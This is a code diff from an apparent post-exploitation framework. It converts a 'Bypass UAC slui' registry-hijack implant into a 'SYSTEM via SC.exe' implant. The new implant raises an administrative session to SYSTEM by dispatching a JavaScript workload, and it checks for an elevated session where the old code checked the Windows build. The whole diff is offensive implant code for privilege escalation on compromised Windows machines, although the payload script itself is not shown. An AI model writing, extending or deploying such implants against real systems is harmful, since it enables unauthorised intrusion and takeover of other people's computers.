@@ -2,15 +2,15 @@ import core.job
 import core.implant
 import uuid
 
-class SLUIJob(core.job.Job):
+class CreateServiceJob(core.job.Job):
     def create(self):
         id = self.options.get("PAYLOAD")
         payload = self.load_payload(id)
         self.options.set("PAYLOAD_DATA", payload)
         if self.session_id == -1:
             return
-        if (int(self.session.build) < 9600 or int(self.session.build) > 17133) and self.options.get("IGNOREBUILD") == "false":
-            self.error("0", "The target may not be vulnerable to this implant. Set IGNOREBUILD to true to run anyway.", "Target build not vuln", "")
+        if self.session.elevated != 1 and self.options.get("IGNOREADMIN") == "false":
+            self.error("0", "This job requires an elevated session. Set IGNOREADMIN to true to run anyway.", "Not elevated", "")
             return False
 
     def done(self):
@@ -18,21 +18,20 @@ class SLUIJob(core.job.Job):
 
     def display(self):
         self.results = "Completed!"
-        #self.shell.print_plain(self.data)
 
-class SLUIImplant(core.implant.Implant):
+class CreateServiceImplant(core.implant.Implant):
 
-    NAME = "Bypass UAC slui"
-    DESCRIPTION = "Bypass UAC via registry hijack for slui.exe. Drops no files to disk."
+    NAME = "SYSTEM via SC.exe"
+    DESCRIPTION = "Elevate from an administrative session to SYSTEM via SC.exe. Drops no files to disk."
     AUTHORS = ["Entynetproject"]
-    STATE = "implant/elevate/bypassuac_slui"
+    STATE = "implant/elevate/system_createservice"
 
     def load(self):
         self.options.register("PAYLOAD", "", "Run listeners for a list of IDs.")
         self.options.register("PAYLOAD_DATA", "", "The actual data.", hidden=True)
 
     def job(self):
-        return SLUIJob
+        return CreateServiceJob
 
     def run(self):
         id = self.options.get("PAYLOAD")
@@ -43,6 +42,6 @@ class SLUIImplant(core.implant.Implant):
             return
 
         workloads = {}
-        workloads["js"] = "data/implant/elevate/bypassuac_slui.js"
+        workloads["js"] = "data/implant/elevate/system_createservice.js"
 
         self.dispatch(workloads, self.job)
